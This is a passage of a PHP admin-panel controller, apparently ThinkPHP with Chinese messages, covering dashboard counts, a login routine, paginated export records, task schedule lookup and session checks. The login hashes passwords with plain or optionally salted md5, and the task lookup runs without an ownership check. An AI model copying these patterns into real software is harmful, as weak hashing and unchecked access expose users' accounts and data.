$saleswhere = array();
if (!$super){
$saleswhere["pid"] = $uid;
}
$salestotal = Db::name('admin')->where($saleswhere)->count(1);
$reback = array();
$reback['mtotal'] = $total;
$reback['simtotal'] = $simtotal;
$reback['tsrtotal'] = $tsrtotal;
$reback['sales'] = $salestotal;
if($reback){
return returnAjax(0,"成功",$reback);
}else{
return returnAjax(1,"失败",0);
}
}
public function administrator()
{
return $this->fetch();
}
public function agent()
{
return $this->fetch();
}
public function operator()
{
return $this->fetch();
}
public function indexV()
{
return $this->fetch('indexV');
}
public function visitor_login($username = '',$password = '',$verify = ''){
if (IS_POST) {
if (!$username ||!$password) {
return $this->error('用户名或者密码不能为空！','');
}
$this->checkVerify($verify);
$user = Db::name('admin')
->alias('a')
->field('a.*, ar.level, ar.name as role_name')
->join('admin_role ar','a.role_id = ar.id','LEFT')
->where('a.username',$username)
->find();
if($user &&$user['status']){
$mpassword = md5($password);
if($user['salt']){
$mpassword = md5($password.$user['salt']);
}
if($mpassword === $user['password']){
$data = array(
'last_login_time'=>time(),
'last_login_ip'=>get_client_ip(1),
);
Db::name('admin')->where(array('id'=>$user['id']))->update($data);
$headpic = $user['logo'];
if($user['logo']){
if (is_numeric($user['logo'])) {
$pic = Db::name('picture')->field('path')->where('id',$user['logo'])->find();
if($pic['path']){
$headpic = $pic['path'];
}
}else{
$headpic = $user['logo'];
}
}
$auth = array(
'uid'=>$user['id'],
'username'=>$user['username'],
'last_login_time'=>$user['last_login_time'],
'level'=>$user['level'],
'role'=>$user['role_name'],
'logo'=>$headpic,
'super'=>$user['super'],
'menu_grouping'=>$user['menu_grouping']
);
session('user_auth',$auth);
session('user_auth_sign',data_auth_sign($auth));
switch($user['role_name']){
case '管理员':
return $this->success('登录成功！',url('user/index/index'));
break;
case '运营商':
return $this->success('登录成功！',url('user/index/index'));
break;
case '代理商':
return $this->success('登录成功！',url('user/index/index'));
break;
case '商家':
return $this->success('登录成功！',url('user/index/index'));
break;
default:
return $this->success('登录成功！',url('user/index/index'));
break;
}
}else {
return $this->error('密码错误！','');
}
}else {
return $this->error('用户不存在或被禁用！','');
}
}else{
return $this->fetch();
}
}
public function export_record()
{
return $this->fetch('exportmanagement/export_record');
}
public function ajax_export_record(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$phone = input('keyword','','trim,strip_tags');
$export = input('operation','','trim,strip_tags');
$startshow = input('startshow','','trim,strip_tags');
$endshow = input('endshow','','trim,strip_tags');
$page = input('page','','trim,strip_tags');
$limit = input('limit','','trim,strip_tags');
if(!$limit)
$limit = 10 ;
if(!$page)
$page = 1;
$where = [];
$admin_info = Db::name('admin')->where('id',$uid)->find();
if($admin_info['role_id'] != 20){
$admin_ids = Db::name('admin')->where('pid',$uid)->column('id');
array_push($admin_ids,$uid);
$where['ex.owner'] = array('in',$admin_ids);
}else{
$where['ex.owner'] = array('eq',$uid);
}
if($phone){
$where['ex.phone'] = array('like',"%".$phone."%");
}
if($export){
$where['ex.export'] = array('eq',$export);
}
if($startshow &&$endshow){
$where['ex.create_time'] = array('between time',[$startshow,$endshow]);
}
$list = Db::name('export_record')
->alias('ex')
->join('admin a','ex.owner = a.id','LEFT')
->where($where)
->page($page,$limit)
->field('ex.*,a.username')
->order('id','desc')
->select();
foreach($list as  $key =>$vo){
$list[$key]['create_time'] = date("Y-m-d H:i:s",$vo['create_time']);
}
$count = Db::name('export_record')->alias('ex')->where($where)->count();
$page_count = ceil($count/$limit);
$data = array();
$data['list'] = $list;
$data['total'] = $count;
$data['page'] = $page_count;
$data['Nowpage'] = $page;
return returnAjax(0,'获取数据成功',$data);
}
public function get_date_time()
{
    // 从请求中获取任务ID
    $task_id = input('task_id', '', 'trim,strip_tags');

    // 创建一个空数组来存储日期和时间数据
    $date_time = [];

    // 查询数据库，获取与任务ID相关的日期数据
    $date_time['date'] = Db::name('auto_task_date')->where('task_id', $task_id)->select();

    // 查询数据库，获取与任务ID相关的时间数据
    $date_time['time'] = Db::name('auto_task_time')->where('task_id', $task_id)->select();

    // 遍历日期数据，将日期的时间部分移除，只保留日期部分
    foreach ($date_time['date'] as $key => $vo) {
        $date_time['date'][$key]['start_date'] = substr($vo['start_date'], 0, strpos($vo['start_date'], ' '));
        $date_time['date'][$key]['end_date'] = substr($vo['end_date'], 0, strpos($vo['end_date'], ' '));
    }

    // 返回成功响应，携带获取的日期和时间数据
    return returnAjax(0, '获取成功', $date_time);
}

public function verify_login_status(){
$user = session('user_auth');
if(
!empty($user['port']) &&
!empty($user['uid']) &&
!empty($user['username']) &&
!empty($user['last_login_time']) &&
!empty($user['level']) &&
!empty($user['role']) &&
$user['port'] != $_SERVER['SERVER_PORT']
){
return returnAjax(1,'未登录');
}
return returnAjax(0,'已登录');
}
public function get_user_info()
{
$user_auth = session('user_auth');
return returnAjax(0,'成功',$user_auth);
}
}
